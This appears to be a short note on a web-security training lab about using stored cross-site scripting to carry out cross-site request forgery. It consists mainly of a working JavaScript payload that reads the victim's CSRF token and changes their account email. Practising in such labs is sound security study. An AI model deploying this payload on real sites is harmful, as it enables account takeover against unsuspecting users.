Lab #16 - Exploiting XSS to perform CSRF 

Target Goal - Exploit stored XSS vulnerability in the blog comment functionality to perform a CSRF attack and change the email address of the victim user.

Creds - wiener:peter

Analysis:

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();

function handleResponse(){
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test3@test.ca')
};
</script>